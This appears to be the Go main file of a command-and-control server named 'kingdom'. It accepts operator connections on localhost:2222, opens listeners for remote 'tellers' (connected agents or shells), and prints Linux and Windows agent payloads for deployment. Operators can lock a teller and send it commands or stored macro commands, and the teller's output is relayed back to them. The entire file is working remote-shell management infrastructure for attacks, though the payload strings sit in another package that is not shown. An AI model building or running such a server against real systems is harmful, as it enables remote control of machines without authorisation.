package main

import (
	"fmt"
	agents "kingdom/internal/agents"
	. "kingdom/internal/clients"
	. "kingdom/internal/listeners"
	. "kingdom/internal/tellers"
	"log"
	"math/rand"
	"strings"
)

func main() {
	clients := make(map[string]Client)
	tellers := make(map[string]*Teller)

	clientChannel := make(chan Client)
	tellerChannel := make(chan *Teller)

	requests := make(chan Request)
	responses := make(chan Response)

	go ClientListener("localhost:2222", requests, clientChannel)

	for {
		select {
		case request := <-requests:
			if request.Target == "!" {
				switch request.Command {
				case "lst":
					if len(tellers) == 0 {
						clients[request.From].Input <- []byte("#!!#No tellers\n")
						break
					}

					var total string

					for name := range tellers {
						total += fmt.Sprintf("%s, %s\n", name, tellers[name].Owner)
					}

					clients[request.From].Input <- []byte("#!!#" + total)
				case "lsc":
					if len(clients) == 0 {
						clients[request.From].Input <- []byte("#!!#No clients\n")
						break
					}

					var total string

					for name := range clients {
						total += fmt.Sprintf("%s\n", name)
					}

					clients[request.From].Input <- []byte("#!!#" + total)
				case "rmt":
					id := strings.TrimSuffix(string(request.Body), "\n")
					_, ok := tellers[id]

					if !ok {
						clients[request.From].Input <- []byte("No such teller.\n")
						break
					}

					delete(tellers, id)
				case "rmc":
					id := strings.TrimSuffix(string(request.Body), "\n")
					_, ok := clients[id]

					if !ok {
						clients[request.From].Input <- []byte("No such client.\n")
						break
					}

					delete(clients, id)
				case "tl":
					bind := strings.TrimSuffix(string(request.Body), "\n")

					go TellerListener(bind, responses, tellerChannel)

					var agent, agent_win = agents.PrintAgent(bind)

					clients[request.From].Input <- []byte("Linux:\n" + agent + "\n\nWindows:\n" + agent_win + "\n")
				case "cl":
					bind := strings.TrimSuffix(string(request.Body), "\n")
					go ClientListener(bind, requests, clientChannel)
				default:
					clients[request.From].Input <- []byte("No such command.\n")
				}
				break
			}

			switch request.Command {
			case "lock":
				teller, ok := tellers[request.Target]

				if !ok {
					clients[request.From].Input <- []byte("No such teller.\n")
					break
				}

				if teller.Owner != "!" {
					clients[request.From].Input <- []byte("Already locked.\n")
					break
				}

				teller.Owner = request.From
				tellers[request.Target] = teller
			case "unlock":
				teller, ok := tellers[request.Target]

				if !ok {
					clients[request.From].Input <- []byte("No such teller.\n")
					break
				}

				if teller.Owner != request.From {
					clients[request.From].Input <- []byte("You do not own that.\n")
					break
				}

				teller.Owner = "!"
				tellers[request.Target] = teller
			case "send":
				teller, ok := tellers[request.Target]

				if !ok {
					clients[request.From].Input <- []byte("No such teller.\n")
					break
				}

				if teller.Owner != request.From {
					clients[request.From].Input <- []byte("You do not own that.\n")
					break
				}

				macros := agents.GetMacroCommands()

				// remove newline from the end of the request.Body
				test := strings.TrimSuffix(string(request.Body), "\n")

				for _, macro := range macros {
					if macro == test {
						request.Body = []byte(agents.GetMacroCommand(macro))
						break
					}
				}

				teller.Input <- request.Body
			}
		case response := <-responses:
			if response.Target == "!" {
				_, ok := clients[string(response.Body)]

				if !ok {
					log.Println("Orphaned response:", response)
					break
				}

				clients[string(response.Body)].Input <- []byte("Your teller died.\n")
				break
			}

			_, ok := clients[response.Target]

			if !ok {
				log.Println("Orphaned response:", response)
				break
			}

			dataStr := string(response.Body)
			clients[response.Target].Input <- []byte(dataStr)
		case client := <-clientChannel:
			name := fmt.Sprint(rand.Int())
			clients[name] = client
			client.Input <- []byte(name + "\n")
		case teller := <-tellerChannel:
			name := fmt.Sprint(rand.Int())
			tellers[name] = teller
		}
	}
}
